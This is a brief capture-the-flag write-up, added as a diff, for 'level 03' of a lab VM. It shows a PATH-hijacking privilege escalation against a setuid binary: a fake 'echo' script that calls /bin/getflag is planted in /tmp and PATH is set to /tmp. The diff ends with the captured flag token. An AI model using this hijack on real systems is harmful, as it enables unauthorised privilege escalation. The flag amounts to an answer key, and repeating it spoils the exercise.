@@ -1,0 +1,14 @@
+level 03 :
+scp -P 4242 level03@192.168.1.147:~/level03 .
+do => file level03
+result => level03: ELF 32-bit LSB executable
+do => strings level03
+result found => /usr/bin/env echo Exploit me
+create file in tmp because : d-wx-wx-wx  4 root root   80 May 15 21:00 tmp
+echo '/bin/getflag' > echo
+chmod 777 echo
+printenv
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
+PATH=/tmp
+
+Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
